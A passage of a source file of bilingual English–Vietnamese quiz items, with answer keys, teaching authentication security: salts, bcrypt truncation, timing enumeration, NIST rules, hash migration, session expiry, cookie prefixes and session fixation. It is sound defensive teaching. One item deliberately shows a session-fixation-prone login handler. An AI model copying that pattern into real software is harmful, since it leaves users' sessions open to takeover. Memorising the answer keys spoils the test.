            'A salt is not a secret and does not have to be — it only has to be unique. Uniqueness kills two things at once: a rainbow table computed in advance is worthless because the attacker did not know your salt when they built it, and identical passwords no longer produce identical digests, so a <code>GROUP BY</code> over the hash column stops handing over thousands of accounts for one crack. What it does nothing about is <em>speed</em>. Cracking one salted SHA-256 hash still runs at billions of guesses per second on a GPU; the salt did not slow a single one of them down. That is the cost parameter\'s job, and it is why the chapter moves on to Argon2id and bcrypt. Option 3 is a common half-truth: the multiplication is real against the whole table, but it says nothing about the effort to break one chosen account, which is usually what an attacker wants. Option 4 attributes memory-hardness to the salt, which is a property of the algorithm. Option 1 treats the salt as a key, which it is not — the thing stored separately and kept secret is a <em>pepper</em>. And note the trap on the other side: one salt shared by every user is no salt at all.',
            'Muối không phải bí mật và không cần phải bí mật — nó chỉ cần DUY NHẤT. Tính duy nhất giết một lúc hai thứ: một bảng cầu vồng tính trước trở nên vô dụng vì lúc dựng nó kẻ tấn công chưa biết muối của bạn, và những mật khẩu giống nhau không còn cho ra chuỗi băm giống nhau, nên một lệnh <code>GROUP BY</code> trên cột băm thôi trao hàng nghìn tài khoản cho một lần bẻ. Thứ nó hoàn toàn không đụng tới là TỐC ĐỘ. Bẻ một chuỗi băm SHA-256 có muối vẫn chạy hàng tỉ lượt đoán mỗi giây trên GPU; cái muối không làm chậm được lượt nào trong số đó. Đấy là việc của tham số chi phí, và đó là lý do chương này đi tiếp sang Argon2id và bcrypt. Phương án 3 là một nửa sự thật rất hay gặp: phép nhân đó có thật khi tính trên CẢ BẢNG, nhưng nó không nói gì về công sức bẻ MỘT tài khoản đã chọn, mà thường đó mới là thứ kẻ tấn công muốn. Phương án 4 gán tính tốn bộ nhớ cho cái muối, trong khi đó là tính chất của thuật toán. Phương án 1 coi muối như một cái khoá, mà nó không phải — thứ được cất riêng và giữ bí mật là một cái TIÊU (pepper). Và nhớ luôn cái bẫy ở phía kia: một cái muối dùng chung cho mọi người dùng thì cũng như không có muối.',
          ),
        }),

        // q8 · đáp án 3
        mcq({
          prompt: B(
            'Measured with ' + c('bcryptjs@2.4.3') + ' on Node 22:' +
            code("const h = bcrypt.hashSync('A'.repeat(72), 10);\nbcrypt.compareSync('A'.repeat(72) + 'DIFFERENT', h);   // -> true") +
            'What is happening, and which users hit it first?',
            'Đo thật với ' + c('bcryptjs@2.4.3') + ' trên Node 22:' +
            code("const h = bcrypt.hashSync('A'.repeat(72), 10);\nbcrypt.compareSync('A'.repeat(72) + 'DIFFERENT', h);   // -> true") +
            'Chuyện gì đang xảy ra, và những người dùng nào chạm phải nó trước tiên?',
          ),
          options: [
            B(
              'The comparison is prefix-based by design, so any password beginning with the stored one verifies; it affects everybody equally and is the reason a maximum length must be enforced',
              'Phép so sánh vốn được thiết kế theo tiền tố, nên mọi mật khẩu bắt đầu bằng cái đã lưu đều qua; nó ảnh hưởng tới mọi người như nhau và là lý do phải áp một độ dài tối đa',
            ),
            B(
              'Cost factor 10 is too low to distinguish long inputs, and raising it to 12 or above makes the two hashes differ as expected',
              'Hệ số chi phí 10 quá thấp để phân biệt các đầu vào dài, và nâng lên 12 trở lên là hai chuỗi băm khác nhau đúng như mong đợi',
            ),
            B(
              'The two strings normalise to the same value because bcrypt applies NFKC before hashing, and NFKC collapses long runs of the same character',
              'Hai chuỗi chuẩn hoá về cùng một giá trị vì bcrypt áp NFKC trước khi băm, và NFKC gộp các đoạn dài lặp cùng một ký tự',
            ),
            B(
              'bcrypt silently truncates its input at 72 bytes, so everything past that is discarded; the limit is bytes rather than characters, so a Vietnamese passphrase reaches it in roughly 24 characters',
              'bcrypt lặng lẽ cắt cụt đầu vào ở 72 BYTE, nên mọi thứ sau đó bị vứt; giới hạn tính theo byte chứ không theo ký tự, nên một câu mật khẩu tiếng Việt chạm nó ở khoảng 24 ký tự',
            ),
          ],
          correct: 3,
          explanation: EX(
            'bcrypt has always taken at most 72 bytes of input, and it discards the rest without a word — no error, no warning, and every test with a short password passes. The measured line above is the proof: two different passwords, one hash, <code>true</code>. The part that turns a curiosity into a real bug is that the limit counts <em>bytes</em>, not characters. Vietnamese with diacritics costs about three bytes per accented character in UTF-8, so a phrase of roughly two dozen characters is already at the ceiling, and Chinese or Japanese reaches it sooner still. The consequence is not that long passphrases are rejected — it is that everything after byte 72 stops contributing any security while the user believes it does. Fixes: pre-hash with SHA-256 and <b>base64-encode the digest before passing it in</b>, because a raw binary digest can contain a NUL byte and some bcrypt implementations truncate there too; or use Argon2id, which has no such limit. Options 1, 2 and 3 each invent a mechanism bcrypt does not have — and note that <code>bcryptjs</code> writes the <code>$2a$</code> prefix, while the modern recommendation for new hashes is <code>$2b$</code>.',
            'bcrypt xưa nay chỉ nhận tối đa 72 byte đầu vào, và nó vứt phần còn lại không nói một lời — không lỗi, không cảnh báo, và mọi phép kiểm với mật khẩu ngắn đều qua. Dòng đo ở trên chính là bằng chứng: hai mật khẩu khác nhau, một chuỗi băm, kết quả <code>true</code>. Phần biến một chuyện lạ thành một lỗi thật là ở chỗ giới hạn đếm theo BYTE chứ không theo ký tự. Tiếng Việt có dấu tốn khoảng ba byte cho mỗi ký tự mang dấu trong UTF-8, nên một câu chừng hai chục ký tự đã chạm trần, còn tiếng Trung hay tiếng Nhật thì chạm sớm hơn nữa. Hệ quả không phải là câu mật khẩu dài bị từ chối — mà là mọi thứ sau byte thứ 72 thôi đóng góp bất kỳ độ an toàn nào trong khi người dùng vẫn tin là có. Cách chữa: băm trước bằng SHA-256 rồi <b>mã hoá base64 chuỗi băm trước khi đưa vào</b>, vì một chuỗi băm nhị phân thô có thể chứa byte NUL và vài bản cài bcrypt cũng cắt cụt ở đó; hoặc dùng Argon2id, thứ không có giới hạn này. Phương án 1, 2 và 3 đều bịa ra một cơ chế mà bcrypt không có — và nhớ thêm rằng <code>bcryptjs</code> ghi tiền tố <code>$2a$</code>, trong khi khuyến nghị hiện đại cho băm mới là <code>$2b$</code>.',
          ),
        }),

        // q9 · đáp án 2
        mcq({
          prompt: B(
            'A login endpoint already returns the same message and the same 401 for a wrong password and for an address with no account. Measured on Node 22, the two branches take ' + c('70.88 ms') + ' and ' + c('0.0002 ms') + '. Is enumeration closed, and what closes it?',
            'Một endpoint đăng nhập đã trả về cùng một thông điệp và cùng một mã 401 cho cả sai mật khẩu lẫn địa chỉ không có tài khoản. Đo thật trên Node 22, hai nhánh mất ' + c('70,88 ms') + ' và ' + c('0,0002 ms') + '. Việc dò tài khoản đã bị bịt chưa, và thứ gì bịt nó?',
          ),
          options: [
            B(
              'Yes, closed. A difference of seventy milliseconds is far below normal network jitter, so it carries no information an attacker can act on across the internet',
              'Rồi, đã bịt. Chênh lệch bảy mươi mili-giây thấp hơn hẳn nhiễu mạng bình thường, nên nó không mang thông tin nào kẻ tấn công dùng được qua Internet',
            ),
            B(
              'No, and the fix is to add a randomised delay of a few hundred milliseconds to both branches so the two distributions overlap',
              'Chưa, và cách sửa là thêm một độ trễ ngẫu nhiên vài trăm mili-giây vào cả hai nhánh để hai phân bố chồng lên nhau',
            ),
            B(
              'No: the fast branch is fast precisely because it skipped the hash, so the clock answers the question the body refuses to. Verify against a dummy hash generated with the same algorithm and parameters, and evaluate the whole condition after it',
              'Chưa: nhánh nhanh nhanh chính vì nó BỎ QUA phép băm, nên cái đồng hồ trả lời đúng câu hỏi mà phần thân từ chối. Hãy đối chiếu với một băm giả sinh bằng cùng thuật toán và cùng tham số, rồi xét trọn điều kiện SAU khi băm xong',
            ),
            B(
              'No, and the only real fix is to remove the account lookup entirely by making login accept a signed identifier rather than an email address',
              'Chưa, và cách chữa thật sự duy nhất là bỏ hẳn bước tra tài khoản bằng cách bắt đăng nhập nhận một định danh đã ký thay vì một địa chỉ email',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The gap here is not a subtle nanosecond side channel — it is five orders of magnitude, visible in a single request from anywhere in the world. And it exists <em>because</em> of the thing protecting your passwords: a slow hash costs about seventy milliseconds when there is a row to check, and costs nothing at all when there is not. Equalising the message and the status code was necessary and is not sufficient. The fix is to make the work identical: keep a dummy hash produced at startup with the same algorithm and the same parameters, verify against it when no account exists, and only then evaluate the full condition. Every early <code>return</code> above the hash is a new timing channel. Option 2 is the classic wrong instinct: random delay adds noise to a signal that averaging removes, so an attacker sending a few thousand requests recovers the difference anyway, and you have made every login slower. Option 1 has the arithmetic backwards. Option 4 solves nothing, since the identifier still has to be looked up. Two follow-ons worth remembering: after a parameter upgrade, old rows verify faster than new ones and leak old-versus-new; and a rate limiter that only triggers on addresses it recognises is a perfect oracle on its own.',
            'Khoảng cách ở đây không phải một kênh phụ nano-giây tinh vi — nó là năm bậc độ lớn, nhìn thấy được từ một request duy nhất, từ bất kỳ đâu trên thế giới. Và nó tồn tại CHÍNH VÌ thứ đang bảo vệ mật khẩu của bạn: một hàm băm chậm tốn chừng bảy mươi mili-giây khi có một dòng để kiểm, và chẳng tốn gì khi không có. Làm cho thông điệp và mã trạng thái giống nhau là việc cần thiết mà chưa đủ. Cách sửa là làm cho KHỐI LƯỢNG CÔNG VIỆC giống nhau: giữ sẵn một băm giả sinh lúc khởi động bằng cùng thuật toán và cùng tham số, đối chiếu với nó khi không có tài khoản, rồi mới xét trọn vẹn điều kiện. Mọi lệnh <code>return</code> sớm nằm phía trên phép băm đều là một kênh thời gian mới. Phương án 2 là bản năng sai kinh điển: độ trễ ngẫu nhiên thêm nhiễu vào một tín hiệu mà phép lấy trung bình gạt đi được, nên kẻ tấn công gửi vài nghìn request vẫn khôi phục được chênh lệch, còn bạn thì đã làm mọi lượt đăng nhập chậm đi. Phương án 1 tính ngược. Phương án 4 chẳng giải quyết gì, vì định danh vẫn phải tra. Hai hệ quả đáng nhớ: sau một lần nâng tham số, các dòng cũ kiểm nhanh hơn các dòng mới và làm rò rỉ chuyện cũ-hay-mới; và một bộ giới hạn tần suất chỉ bật lên với những địa chỉ nó nhận ra thì tự nó đã là một cỗ máy dò hoàn hảo.',
          ),
        }),

        // q10 · đáp án 0
        mcq({
          prompt: B(
            'Which set of password rules does current NIST guidance recommend <em>against</em>, and what is the reasoning?',
            'Bộ quy tắc mật khẩu nào bị hướng dẫn hiện hành của NIST khuyến nghị KHÔNG dùng, và lập luận là gì?',
          ),
          options: [
            B(
              'Composition rules, scheduled expiry, password hints and security questions, and blocking paste — each narrows the search space or defeats password managers instead of widening what an attacker must try',
              'Quy tắc thành phần ký tự, hết hạn theo lịch, gợi ý mật khẩu và câu hỏi bảo mật, và chặn dán — mỗi thứ đều thu hẹp không gian tìm kiếm hoặc phá hỏng trình quản lý mật khẩu thay vì mở rộng thứ kẻ tấn công phải thử',
            ),
            B(
              'Minimum lengths above eight characters, breach-list checking and rate limiting, because all three push users toward writing passwords down',
              'Độ dài tối thiểu trên tám ký tự, đối chiếu danh sách rò rỉ và giới hạn tần suất, vì cả ba đều đẩy người dùng tới chỗ ghi mật khẩu ra giấy',
            ),
            B(
              'Allowing spaces, emoji and passphrases longer than sixty-four characters, because they cannot be hashed consistently across platforms',
              'Cho phép dấu cách, emoji và câu mật khẩu dài hơn sáu mươi tư ký tự, vì chúng không băm ra kết quả nhất quán giữa các nền tảng',
            ),
            B(
              'Storing a password hash at all for accounts that also have a second factor, since the factor makes the stored hash a liability with no benefit',
              'Việc lưu chuỗi băm mật khẩu cho những tài khoản đã có yếu tố thứ hai, vì cái yếu tố ấy khiến chuỗi băm đã lưu thành gánh nặng mà không lợi ích gì',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Every item on that list was written to make passwords stronger and measurably does the opposite. Composition rules ("one upper, one digit, one symbol") produce <code>Password1!</code> at industrial scale — a string that satisfies every rule, sits in every wordlist and falls in under a second; the rule narrowed the space instead of widening it. Ninety-day expiry produces <code>MatKhau01</code> followed by <code>MatKhau02</code>, and rotation should be triggered by evidence of compromise rather than a calendar. Hints and security questions are answers that can be looked up — a question whose answer is public is not authentication, it is a quiz. Blocking paste breaks password managers, which are the single most effective thing a user can do. What stays is short and boring: a real minimum length with a generous maximum, a check against a breach corpus, and rate limiting per account. Option 2 inverts the guidance, option 3 inverts it again (accepting every printable character is explicitly recommended), and option 4 describes a trade nobody makes.',
            'Mọi mục trong danh sách đó được viết ra để làm mật khẩu mạnh hơn, và đo được là chúng làm điều ngược lại. Quy tắc thành phần ký tự ("một chữ hoa, một chữ số, một ký hiệu") sản xuất ra <code>Password1!</code> ở quy mô công nghiệp — một chuỗi thoả mọi luật, nằm trong mọi từ điển, và gục trong chưa tới một giây; cái luật ấy đã THU HẸP không gian thay vì mở rộng nó. Hết hạn chín mươi ngày sản xuất ra <code>MatKhau01</code> rồi <code>MatKhau02</code>, và việc đổi mật khẩu nên được kích hoạt bởi BẰNG CHỨNG bị xâm nhập chứ không phải bởi một cuốn lịch. Gợi ý và câu hỏi bảo mật là những câu trả lời tra cứu được — một câu hỏi mà đáp án nằm công khai thì không phải phép xác thực, nó là một trò đố vui. Chặn dán làm hỏng trình quản lý mật khẩu, thứ hiệu quả nhất mà một người dùng có thể làm. Thứ còn lại thì ngắn và nhàm: một độ dài tối thiểu thật sự với một trần rộng rãi, một phép đối chiếu với kho dữ liệu rò rỉ, và giới hạn tần suất theo tài khoản. Phương án 2 lật ngược hướng dẫn, phương án 3 lật ngược lần nữa (chấp nhận mọi ký tự in được là điều được khuyến nghị tường minh), còn phương án 4 mô tả một cuộc đánh đổi không ai làm.',
          ),
        }),

        // q11 · đáp án 1
        mcq({
          prompt: B(
            'You inherit a table of unsalted MD5 password hashes. You cannot reverse them, and a mass "reset your password" email is indistinguishable from phishing. What gets every row to a modern hash fastest, without locking anyone out?',
            'Bạn tiếp quản một cái bảng chứa băm mật khẩu MD5 không muối. Bạn không đảo ngược được chúng, và một đợt gửi thư "hãy đặt lại mật khẩu" hàng loạt thì không phân biệt được với thư lừa đảo. Cách nào đưa mọi dòng lên một hàm băm hiện đại nhanh nhất mà không khoá ai ra ngoài?',
          ),
          options: [
            B(
              'Rehash lazily on each successful login and accept that the tail takes years, since that is the only moment the plaintext is available and nothing else is possible',
              'Băm lại lười biếng ở mỗi lượt đăng nhập thành công và chấp nhận cái đuôi kéo dài nhiều năm, vì đó là khoảnh khắc duy nhất có bản rõ và không còn cách nào khác',
            ),
            B(
              'Wrap the existing digests immediately in a background job — store the slow hash of the md5 hex string behind a marker prefix — and then unwrap to a plain modern hash lazily as each user logs in',
              'Bọc ngay các chuỗi băm hiện có bằng một tác vụ nền — lưu chuỗi băm chậm CỦA chuỗi md5 hex, đặt sau một tiền tố đánh dấu — rồi gỡ bọc thành băm hiện đại thuần lười biếng khi từng người dùng đăng nhập',
            ),
            B(
              'Add a per-user salt to the existing md5 digests in a background job, which restores the property the original scheme was missing and can be done without the plaintext',
              'Thêm muối riêng cho từng người vào các chuỗi băm md5 hiện có bằng một tác vụ nền, việc này khôi phục đúng tính chất mà lược đồ gốc thiếu và làm được mà không cần bản rõ',
            ),
            B(
              'Move the md5 column into an encrypted column and decrypt it at login time, which removes the exposure without changing the verification path',
              'Chuyển cột md5 sang một cột được mã hoá và giải mã lúc đăng nhập, cách này gỡ bỏ chỗ phơi bày mà không đổi đường kiểm tra',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Lazy migration alone is right for an algorithm swap between two <em>sound</em> schemes, because a bcrypt row that has not logged in yet is still a real hash. It is not enough here: unsalted MD5 in a table today means every password in that table is exposed today, and a tail measured in years is a tail of exposure. Wrapping fixes it without the plaintext, because you do not need the password to hash the thing you already have. Compute <code>slowHash(md5_hex)</code> for every row, store it behind a marker such as <code>boc1$</code>, and the digest that was crackable in microseconds now costs the full parameterised hash per guess. Verification then dispatches on the prefix: hash the submitted password with md5 first, then verify against the wrapper. On the next successful login you hold the plaintext, so you replace the row with a plain modern hash and the marker disappears. The two mechanisms are independent — if the background job dies halfway, both formats still verify. The one thing that will lock people out is getting the legacy encoding wrong: match it byte for byte, including case, and test on a copy with a real known password first. Option 3 is the trap: adding a salt now protects nothing, because the attacker holding the dump gets the salt too and the fast hash is still fast. Option 4 moves the problem to wherever the encryption key lives.',
            'Chuyển đổi lười biếng là đúng khi đổi giữa hai lược đồ đều LÀNH MẠNH, vì một dòng bcrypt chưa ai đăng nhập vào vẫn là một chuỗi băm thật. Ở đây thì chưa đủ: MD5 không muối nằm trong bảng hôm nay nghĩa là mọi mật khẩu trong bảng đó đang phơi ra hôm nay, và một cái đuôi đo bằng năm là một cái đuôi phơi bày. Bọc lại chữa được điều đó mà không cần bản rõ, vì bạn đâu cần mật khẩu để băm cái thứ bạn đã có sẵn. Tính <code>bămChậm(md5_hex)</code> cho từng dòng, lưu sau một dấu hiệu kiểu <code>boc1$</code>, thế là cái chuỗi băm vốn bẻ được trong vài micro-giây nay tốn trọn một lượt băm có tham số cho mỗi lần đoán. Lúc kiểm thì rẽ nhánh theo tiền tố: băm md5 mật khẩu gửi lên trước, rồi đối chiếu với lớp bọc. Ở lượt đăng nhập thành công kế tiếp bạn cầm bản rõ, nên thay dòng đó bằng một chuỗi băm hiện đại thuần và cái dấu hiệu biến mất. Hai cơ chế này độc lập nhau — tác vụ nền chết giữa chừng thì cả hai định dạng vẫn kiểm được. Thứ duy nhất sẽ khoá người ta ra ngoài là làm sai cách mã hoá của lược đồ cũ: hãy khớp từng byte, kể cả hoa thường, và thử trên một bản sao với một mật khẩu đã biết trước. Phương án 3 là cái bẫy: thêm muối vào lúc này chẳng bảo vệ gì, vì kẻ cầm bản trích xuất cũng cầm luôn cái muối và hàm băm nhanh thì vẫn nhanh. Phương án 4 chỉ dời vấn đề sang chỗ cất cái khoá mã hoá.',
          ),
        }),

        /* ── Chương 3 — phiên và cookie (4 câu) ────────────────────────── */

        // q12 · đáp án 3
        mcq({
          prompt: B(
            'A session table carries both ' + c('activeAt') + ' (idle expiry, two hours) and ' + c('absoluteExpiresAt') + ' (thirty days, never extended). Why are both needed rather than either one alone?',
            'Một bảng phiên mang cả ' + c('activeAt') + ' (hạn nghỉ, hai giờ) lẫn ' + c('absoluteExpiresAt') + ' (ba mươi ngày, không bao giờ gia hạn). Vì sao cần cả hai chứ không phải riêng cái nào?',
          ),
          options: [
            B(
              'The absolute one is for auditing and the idle one for security; only the idle column is consulted when deciding whether a session is still valid',
              'Cái tuyệt đối dùng để kiểm toán còn cái nghỉ dùng cho bảo mật; chỉ cột hạn nghỉ được tra khi quyết định một phiên còn hợp lệ hay không',
            ),
            B(
              'Two columns let the cleanup job delete in two passes, which keeps each delete small enough not to lock the table; either one alone would work for validation',
              'Hai cột cho phép tác vụ dọn dẹp xoá làm hai lượt, giữ mỗi lượt xoá đủ nhỏ để không khoá bảng; riêng cái nào cũng đủ cho việc kiểm hợp lệ',
            ),
            B(
              'The idle window exists only to make "last active" accurate in the device list; without it the absolute ceiling would already be a complete answer',
              'Cửa sổ nghỉ chỉ tồn tại để làm cho mục "hoạt động lần cuối" chính xác trong danh sách thiết bị; không có nó thì cái trần tuyệt đối đã là một câu trả lời trọn vẹn',
            ),
            B(
              'Sliding expiry alone never ends a stolen session, because an attacker polling one harmless endpoint every hour keeps it alive forever; the absolute ceiling is the only thing that guarantees the session eventually dies',
              'Riêng hạn trượt thì không bao giờ chấm dứt một phiên bị trộm, vì kẻ tấn công chỉ cần gọi một endpoint vô hại mỗi tiếng là giữ nó sống mãi; cái trần tuyệt đối là thứ duy nhất bảo đảm phiên rồi sẽ chết',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The two columns answer two different fears. Idle expiry protects the unattended browser — a laptop left open in a café stops being a live session after two hours of nothing. Absolute expiry protects against the case idle expiry is blind to: a thief with a stolen token is not idle. One request an hour to any endpoint at all keeps a sliding window open indefinitely, so a session with only an idle timeout is, in the hands of somebody using it, permanent. The ceiling must therefore never be extended by activity — the moment rotation or refresh moves it, you have turned it back into a sliding window with more code. Pick the pair deliberately and write down why: fifteen minutes idle with a twelve-hour ceiling for banking, thirty days with a ninety-day ceiling for a consumer product, an hour with an eight-hour ceiling for an internal admin tool. Options 1 and 3 demote one column to bookkeeping, and option 2 describes a cleanup detail rather than a validity rule.',
            'Hai cột trả lời hai nỗi sợ khác nhau. Hạn nghỉ bảo vệ cái trình duyệt bỏ đó — một cái laptop để mở trong quán cà phê thôi là một phiên sống sau hai giờ không ai đụng tới. Hạn tuyệt đối bảo vệ đúng cái ca mà hạn nghỉ mù tịt: một tên trộm đang cầm token thì đâu có nghỉ. Một request mỗi tiếng vào bất kỳ endpoint nào cũng giữ một cửa sổ trượt mở vô hạn, nên một phiên chỉ có hạn nghỉ, trong tay người đang dùng nó, là vĩnh viễn. Vì thế cái trần không bao giờ được kéo dài ra bởi hoạt động — ngay khi việc xoay vòng hay làm mới dịch nó đi, bạn đã biến nó trở lại thành một cửa sổ trượt kèm thêm mã. Hãy chọn cặp số một cách có chủ đích và ghi lại lý do: mười lăm phút nghỉ với trần mười hai giờ cho ngân hàng, ba mươi ngày với trần chín mươi ngày cho sản phẩm tiêu dùng, một giờ với trần tám giờ cho công cụ quản trị nội bộ. Phương án 1 và 3 hạ một cột xuống thành việc sổ sách, còn phương án 2 mô tả một chi tiết dọn dẹp chứ không phải một luật về tính hợp lệ.',
          ),
        }),

        // q13 · đáp án 2
        mcq({
          prompt: B(
            'Naming a cookie ' + c('__Host-session') + ' changes how the browser treats it. What exactly does the prefix force, and which attack does that close?',
            'Đặt tên một cookie là ' + c('__Host-session') + ' làm thay đổi cách trình duyệt đối xử với nó. Chính xác thì tiền tố đó ép buộc điều gì, và nó đóng cú tấn công nào?',
          ),
          options: [
            B(
              'It forces <code>HttpOnly</code>, <code>Secure</code> and <code>SameSite=Strict</code>, which together close cross-site request forgery without any further middleware',
              'Nó ép <code>HttpOnly</code>, <code>Secure</code> và <code>SameSite=Strict</code>, ba thứ cùng nhau đóng được tấn công giả mạo request xuyên trang mà không cần thêm middleware nào',
            ),
            B(
              'It forces the cookie to be sent only to the exact path that set it, which prevents a compromised page elsewhere on the origin from reading it',
              'Nó ép cookie chỉ được gửi tới đúng cái path đã đặt nó, ngăn một trang bị chiếm ở chỗ khác trên cùng origin đọc được nó',
            ),
            B(
              'It forces <code>Secure</code>, <code>Path=/</code> and the complete absence of a <code>Domain</code> attribute — the browser drops the cookie otherwise — which makes it host-only and blocks cookie tossing from a subdomain',
              'Nó ép <code>Secure</code>, <code>Path=/</code> và sự VẮNG MẶT hoàn toàn của thuộc tính <code>Domain</code> — không thì trình duyệt vứt cookie đi — khiến nó chỉ thuộc về đúng host đó và chặn được cú ném cookie từ một tên miền con',
            ),
            B(
              'It marks the cookie as first-party so that browsers exempt it from third-party cookie blocking, which is why session cookies keep working in private windows',
              'Nó đánh dấu cookie là bên-thứ-nhất để trình duyệt miễn cho nó khỏi việc chặn cookie bên thứ ba, và đó là lý do cookie phiên vẫn chạy trong cửa sổ ẩn danh',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The prefix is enforced by the browser at the moment the cookie is set: <code>Secure</code> must be present, <code>Path</code> must be exactly <code>/</code>, and <code>Domain</code> must be absent entirely. Miss any one and the cookie is simply dropped — silently, which is why a first attempt often looks like "cookies stopped working". What you get in exchange is the host-only guarantee. Without it, a cookie scoped with <code>Domain=example.com</code> travels to every subdomain including the abandoned blog and the stale CNAME pointing at an unclaimed bucket, and worse, a compromised subdomain can <em>set</em> a cookie of the same name and overwrite yours — cookie tossing, which is how session fixation gets its foothold. Option 1 is the common misreading: the prefix does not imply <code>HttpOnly</code> or any <code>SameSite</code> value, and you still set those yourself. Option 2 inverts the <code>Path</code> rule and also overstates paths generally, which are not a security boundary — any page on the origin can read a path-scoped cookie through an iframe at that path. Option 4 describes something the prefix does not do.',
            'Tiền tố này được TRÌNH DUYỆT áp ngay lúc cookie được đặt: phải có <code>Secure</code>, <code>Path</code> phải đúng bằng <code>/</code>, và <code>Domain</code> phải vắng mặt hoàn toàn. Thiếu một trong ba là cookie bị vứt — trong im lặng, và đó là lý do lần thử đầu tiên hay trông giống "cookie tự dưng hỏng". Đổi lại bạn nhận được bảo đảm chỉ-thuộc-về-host-này. Không có nó, một cookie đặt <code>Domain=example.com</code> sẽ đi tới mọi tên miền con, kể cả cái blog bỏ hoang và cái CNAME cũ trỏ vào một bucket không ai nhận, và tệ hơn nữa, một tên miền con bị chiếm có thể ĐẶT một cookie trùng tên và ghi đè cookie của bạn — đó là cú ném cookie, cách mà tấn công cố định phiên đặt được chân vào. Phương án 1 là cách đọc sai hay gặp: tiền tố này không ngụ ý <code>HttpOnly</code> hay bất kỳ giá trị <code>SameSite</code> nào, bạn vẫn phải tự đặt chúng. Phương án 2 lật ngược luật <code>Path</code> và cũng nói quá về path nói chung, vốn không phải một ranh giới bảo mật — bất kỳ trang nào trên cùng origin cũng đọc được cookie giới hạn theo path bằng cách dựng một iframe tại đúng path đó. Phương án 4 mô tả một việc mà tiền tố này không làm.',
          ),
        }),

        // q14 · đáp án 0
        mcq({
          prompt: B(
            'A login handler authenticates the user and then attaches them to the session row that already exists:' +
            code("await prisma.session.update({\n  where: { id: req.session.id },   // the SAME session id\n  data:  { userId: u.id },        // only attaches the user\n});") +
            'What is the vulnerability, and what is the fix?',
            'Một handler đăng nhập xác thực người dùng rồi gắn họ vào chính cái dòng phiên đã có sẵn:' +
            code("await prisma.session.update({\n  where: { id: req.session.id },   // VẪN id phiên cũ\n  data:  { userId: u.id },        // chỉ gắn thêm người dùng\n});") +
            'Lỗ hổng ở đây là gì, và cách sửa là gì?',
          ),
          options: [
            B(
              'Session fixation: an attacker who can plant a session id in the victim\'s browser inherits an authenticated session the moment the victim logs in. Revoke the old row and issue a completely new token on every privilege change',
              'Cố định phiên: kẻ tấn công cắm được một id phiên vào trình duyệt nạn nhân sẽ thừa hưởng một phiên đã xác thực ngay khi nạn nhân đăng nhập. Hãy thu hồi dòng cũ và cấp một token hoàn toàn mới ở mỗi lần thay đổi đặc quyền',
            ),
            B(
              'A race condition: two tabs logging in at the same time both update the same row, so the second overwrites the first and one tab ends up authenticated as the other user',
              'Một tình huống tranh chấp: hai tab cùng đăng nhập một lúc đều cập nhật cùng một dòng, nên cái thứ hai ghi đè cái thứ nhất và một tab kết thúc bằng việc đăng nhập dưới danh nghĩa người kia',
            ),
            B(
              'A privacy leak: the pre-login session already carries analytics identifiers, which become permanently linked to the account and cannot be separated afterwards',
              'Một chỗ rò rỉ riêng tư: phiên trước khi đăng nhập vốn đã mang các định danh phân tích, chúng bị nối vĩnh viễn vào tài khoản và sau đó không tách ra được',
            ),
            B(
              'Nothing, provided the session id came from a CSPRNG: reusing an unguessable id is the standard optimisation, and it is what keeps a shopping cart across the login boundary',
              'Không có gì, miễn là id phiên sinh từ một CSPRNG: dùng lại một id không đoán được là cách tối ưu tiêu chuẩn, và chính nó giữ được giỏ hàng qua ranh giới đăng nhập',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Fixation is theft run backwards. Instead of stealing a session id, the attacker <em>gives</em> the victim one — through a compromised subdomain tossing a cookie, through a session id accepted from a query parameter, or through XSS anywhere on the origin, since <code>HttpOnly</code> prevents reading a cookie but not writing a differently named one. Then they wait. The victim logs in with a correct password and a correct second factor; nothing looks wrong; and because the id never changed, the attacker now holds an authenticated session. The rule that removes the whole class is short: <b>never raise the privilege of an existing session, replace it.</b> That applies at login, at completion of MFA, at a password change, when an admin starts impersonating someone, and when an invitation grants a role. Option 4 names the reason people write this code — the cart survives — and the cart is exactly why it must be done properly: migrate the <em>rows</em> to the user id inside a transaction, then revoke the old session and issue a new one. Option 2 describes a bug that is not this one, and option 3 is a real concern of a different kind.',
            'Cố định phiên là vụ trộm chạy ngược. Thay vì đánh cắp một id phiên, kẻ tấn công ĐƯA cho nạn nhân một cái — qua một tên miền con bị chiếm ném cookie sang, qua một id phiên được chấp nhận từ tham số truy vấn, hoặc qua XSS ở bất kỳ đâu trên cùng origin, vì <code>HttpOnly</code> ngăn ĐỌC một cookie chứ không ngăn GHI một cookie mang tên khác. Rồi hắn chờ. Nạn nhân đăng nhập với mật khẩu đúng và yếu tố thứ hai đúng; không có gì trông sai cả; và vì cái id không hề đổi, kẻ tấn công giờ đang cầm một phiên đã xác thực. Cái luật xoá sạch cả lớp lỗi này rất ngắn: <b>đừng bao giờ NÂNG đặc quyền của một phiên đang có, hãy THAY nó.</b> Điều đó áp dụng lúc đăng nhập, lúc hoàn tất yếu tố thứ hai, lúc đổi mật khẩu, khi một quản trị viên bắt đầu đóng vai người khác, và khi một lời mời cấp thêm vai trò. Phương án 4 gọi tên đúng lý do người ta viết đoạn mã này — giỏ hàng còn nguyên — và cái giỏ hàng chính là lý do phải làm cho đúng: chuyển các DÒNG DỮ LIỆU sang id người dùng trong một giao dịch, rồi thu hồi phiên cũ và cấp phiên mới. Phương án 2 mô tả một lỗi khác, còn phương án 3 là một mối lo có thật thuộc loại khác.',
          ),
        }),

        // q15 · đáp án 1
        mcq({
          prompt: B(
            'A team argues that CSRF cannot affect their API because CORS is configured to allow only their own origin. Why is that reasoning wrong, and which defence covers an attack coming from one of their own subdomains?',
            'Một nhóm lập luận rằng CSRF không ảnh hưởng tới API của họ vì CORS đã cấu hình chỉ cho phép đúng origin của họ. Vì sao lập luận đó sai, và biện pháp nào phủ được một cú tấn công đến từ chính một tên miền con của họ?',
          ),
          options: [
            B(
              'CORS is misconfigured in that case: allowing only one origin still permits credentialed requests unless <code>Access-Control-Allow-Credentials</code> is explicitly false, and setting it false fixes both problems at once',
              'Trong trường hợp đó CORS bị cấu hình sai: chỉ cho phép một origin thì vẫn cho qua các request có kèm tín vật, trừ khi <code>Access-Control-Allow-Credentials</code> được đặt tường minh là false, và đặt nó false sửa được cả hai vấn đề cùng lúc',
            ),
            B(
